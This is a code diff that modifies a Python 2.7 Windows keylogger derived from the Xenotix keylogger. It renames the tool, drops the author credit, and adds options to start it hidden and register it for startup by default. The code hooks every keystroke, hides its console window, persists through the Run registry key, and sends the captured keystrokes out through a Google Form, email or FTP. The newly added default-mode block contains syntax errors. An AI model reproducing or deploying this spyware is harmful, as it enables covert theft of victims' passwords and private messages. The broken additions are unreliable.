@@ -12,22 +12,30 @@ FEATURES
 3.SEND LOGS TO EMAIL
 4.SEND LOGS TO FTP
 
-MINIMUM REQUIREMENTS
-===================
-Python 2.7: http://www.python.org/getit/
-pyHook Module: http://sourceforge.net/projects/pyhook/
-pyrhoncom Module: http://sourceforge.net/projects/pywin32/
 
-pyHook Module - 
+pyHook Module -
 Unofficial Windows Binaries for Python Extension Packages: http://www.lfd.uci.edu/~gohlke/pythonlibs/
 
 
-NOTE: YOU ARE FREE TO COPY,MODIFY,REUSE THE SOURCE CODE FOR EDUCATIONAL PURPOSE ONLY.
+NOTE: YOU ARE FREE TO COPY, MODIFY, AND REUSE THE SOURCE CODE, FOR EDUCATIONAL PURPOSES ONLY.
 '''
+
+# Minimum amount of characters typed before we write to log
+collect = 50
+
+startdefaultmode = False
+
+# Always start the program in this mode if startdefaultmode is true
+defaultmode = "local"
+
+# Add program to startup by default?
+defaultstartup = False
+
+
 try:
     import pythoncom, pyHook
 except:
-    print "Please Install pythoncom and pyHook modules"
+    print "Could not import module(s) - are the requirements installed?"
     exit(0)
 import os
 import sys
@@ -39,17 +47,17 @@ import datetime,time
 import win32event, win32api, winerror
 from _winreg import *
 
-#Disallowing Multiple Instance
+# Disallowing Multiple Instances
 mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     mutex = None
-    print "Multiple Instance not Allowed"
+    print "Multiple Instances not allowed."
     exit(0)
 x=''
 data=''
 count=0
 
-#Hide Console
+# Hide Console
 def hide():
     import win32console,win32gui
     window = win32console.GetConsoleWindow()
@@ -57,19 +65,17 @@ def hide():
     return True
 
 def msg():
-    print """\n \nXenotix Python Keylogger for Windows
-Coder: Ajin Abraham <ajin25@gmail.com>
-OPENSECURITY.IN
+    print """
 
-usage:xenotix_python_logger.py mode [optional:startup]
+usage: keylogger-2.7.py [mode] [optional:startup]
 
 mode:
-     local: store the logs in a file [keylogs.txt]
-     
+     local: store the logs in a file [key.log]
+
      remote: send the logs to a Google Form. You must specify the Form URL and Field Name in the script.
-     
+
      email: send the logs to an email. You must specify (SERVER,PORT,USERNAME,PASSWORD,TO).
-     
+
      ftp: upload logs file to an FTP account. You must specify (SERVER,USERNAME,PASSWORD,SSL OPTION,OUTPUT DIRECTORY).
 
 [optional] startup: This will add the keylogger to windows startup.\n\n"""
@@ -85,22 +91,22 @@ def addStartup():
     key2change= OpenKey(HKEY_CURRENT_USER,
     keyVal,0,KEY_ALL_ACCESS)
 
-    SetValueEx(key2change, "Xenotix Keylogger",0,REG_SZ, new_file_path)
+    SetValueEx(key2change, "PyLogger",0,REG_SZ, new_file_path)
 
-#Local Keylogger
+# Local Keylogger
 def local():
     global data
-    if len(data)>100:
-        fp=open("keylogs.txt","a")
+    if len(data)>collect:
+        fp=open("key.log","a")
         fp.write(data)
         fp.close()
         data=''
     return True
 
-#Remote Google Form logs post
+# Remote Google Form logs post
 def remote():
     global data
-    if len(data)>100:
+    if len(data)>collect:
         url="https://docs.google.com/forms/d/xxxxxxxxxxxxxxxxxxxxxxxxxxxxx" #Specify Google Form URL here
         klog={'entry.xxxxxxxxxxx':data} #Specify the Field Name here
         try:
@@ -112,7 +118,7 @@ def remote():
             print e
     return True
 
-#Email Logs
+# Email Logs
 class TimerClass(threading.Thread):
     def __init__(self):
         threading.Thread.__init__(self)
@@ -120,11 +126,11 @@ class TimerClass(threading.Thread):
     def run(self):
         while not self.event.is_set():
             global data
-            if len(data)>100:
+            if len(data)>collect:
                 ts = datetime.datetime.now()
                 SERVER = "smtp.gmail.com" #Specify Server Here
                 PORT = 587 #Specify Port Here
-                USER="your_email@gmail.com"#Specify Username Here 
+                USER="your_email@gmail.com"#Specify Username Here
                 PASS="password_here"#Specify Password Here
                 FROM = USER#From address is taken from username
                 TO = ["to_address@gmail.com"] #Specify to address.Use comma if more than one to address is needed.
@@ -149,10 +155,10 @@ Subject: %s
                     print e
             self.event.wait(120)
 
-#Upload logs to FTP account
+# Upload logs to FTP account
 def ftp():
     global data,count
-    if len(data)>100:
+    if len(data)>collect:
         count+=1
         FILENAME="logs-"+str(count)+".txt"
         fp=open(FILENAME,"a")
@@ -185,10 +191,26 @@ def main():
     if len(sys.argv)==1:
         msg()
         exit(0)
+
+    if defaultstartup == True:
+        addstartup()
+
+    if startdefaultmode == True:
+        if defaultmode = "local":
+            x=1
+            hide()
+        elif defaultmode = "remote":
+            x=2
+            hide()
+        elif defaultmode = "email":
+            hide()
+            email=TimerClass()
+            email.start()
+
     else:
         if len(sys.argv)>2:
             if sys.argv[2]=="startup":
-                addStartup() 
+                addStartup()
             else:
                 msg()
                 exit(0)
@@ -223,8 +245,8 @@ def keypressed(event):
         keys='<TAB>'
     else:
         keys=chr(event.Ascii)
-    data=data+keys 
-    if x==1:  
+    data=data+keys
+    if x==1:
         local()
     elif x==2:
         remote()
